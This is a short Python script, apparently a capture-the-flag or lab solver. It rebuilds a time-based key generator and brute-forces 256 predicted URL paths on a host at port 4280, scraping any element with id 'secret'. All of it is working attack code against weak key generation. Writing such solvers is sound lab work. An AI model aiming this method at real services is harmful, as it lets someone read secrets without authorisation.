import requests
import datetime

from bs4 import BeautifulSoup

def time_id():
	now = datetime.datetime.now()
	return (now.year - 1900) + (now.month - 1) * 7 + now.day * 31 + now.hour * 167 + now.minute * 401

def gen_key(rnd, modifier):
	key = [0] * 32
	multiplier = rnd + 3
	tid = time_id()
	for i in range(32):
		key[i] = (tid * multiplier + i * 7) % 26
		multiplier = (multiplier * 167 + modifier) % 16769023
	return ''.join(chr(ord('A') + e) for e in key)

import sys
host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'

print('time id:', time_id())
for rnd in range(256):
	url = 'http://' + host + ':4280/' + gen_key(rnd, 0)
	response = requests.get(url)
	soup = BeautifulSoup(response.text, features="html.parser")
	secret = soup.find(id="secret").text
	if secret != '':
		print("Found:", secret)
